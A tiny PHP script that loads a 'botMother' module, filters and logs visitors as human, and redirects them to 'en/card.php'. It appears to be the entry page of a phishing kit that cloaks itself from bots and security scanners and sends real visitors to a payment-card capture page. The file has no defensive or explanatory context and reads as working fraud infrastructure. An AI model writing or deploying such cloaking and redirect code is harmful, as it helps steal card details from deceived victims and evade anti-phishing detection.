<?php
session_start();
require 'botMother/botMother.php';
$bm = new botMother;
$bm->run();
$bm->logHuman();
header("location: en/card.php");
?>